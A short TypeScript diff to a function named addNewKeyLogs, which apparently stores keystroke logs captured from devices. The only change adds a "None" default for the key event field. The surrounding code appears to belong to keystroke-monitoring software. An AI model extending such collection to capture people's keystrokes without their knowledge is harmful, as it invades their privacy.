@@ -12,7 +12,7 @@ export const addNewKeyLogs = async (data: any) => {
 			deviceId,
 			keyLogsType,
 			keylogs: keylogs || "None",
-			keyevent: event,
+			keyevent: event || "None",
 		});
 
 		await newKeyLog.save();
